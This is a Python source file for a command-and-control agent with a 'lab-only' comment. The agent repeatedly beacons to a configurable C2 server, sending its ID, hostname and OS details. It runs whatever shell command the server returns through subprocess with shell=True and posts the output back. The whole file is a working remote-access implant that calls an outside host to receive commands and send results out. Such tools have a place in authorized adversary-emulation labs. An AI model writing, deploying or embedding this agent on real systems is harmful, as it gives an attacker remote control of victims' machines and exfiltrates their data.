# agent.py
# Lab-only agent. Only run on a VM you own with explicit consent.

import requests
import subprocess
import time
import socket
import platform
import uuid

# ---------------- CONFIG ----------------
SERVER = "http://192.168.1.100:8888"   # <-- Change to your C2 server's lab IP
SLEEP_INTERVAL = 10                     # Seconds between check-ins
AGENT_ID = str(uuid.uuid4())[:8]        # Unique per run; persist if you want
# ----------------------------------------

HOSTNAME = socket.gethostname()
OS_INFO = platform.system() + " " + platform.release()

def run_command(cmd):
    """Execute command and return output."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=30
        )
        return result.stdout or result.stderr or "(no output)"
    except subprocess.TimeoutExpired:
        return "(timeout)"
    except Exception as e:
        return f"(error: {e})"

def beacon():
    """Check in with server and get next command."""
    try:
        r = requests.post(
            f"{SERVER}/beacon",
            json={
                "agent_id": AGENT_ID,
                "hostname": HOSTNAME,
                "os": OS_INFO
            },
            timeout=10
        )
        return r.json()
    except Exception as e:
        print(f"[-] Beacon failed: {e}")
        return None

def send_results(technique, output):
    """Send command output back to server."""
    try:
        requests.post(
            f"{SERVER}/results",
            json={
                "agent_id": AGENT_ID,
                "technique": technique,
                "output": output
            },
            timeout=10
        )
    except Exception as e:
        print(f"[-] Failed to send results: {e}")

def main():
    print(f"[*] Agent {AGENT_ID} starting on {HOSTNAME} ({OS_INFO})")
    print(f"[*] Connecting to {SERVER}")

    while True:
        data = beacon()
        if data and data.get("cmd"):
            tech = data.get("technique", "unknown")
            name = data.get("name", "unknown")
            cmd = data.get("cmd")
            print(f"[+] Executing {tech} - {name}: {cmd}")
            output = run_command(cmd)
            send_results(tech, output)

        time.sleep(SLEEP_INTERVAL)

if __name__ == "__main__":
    main()
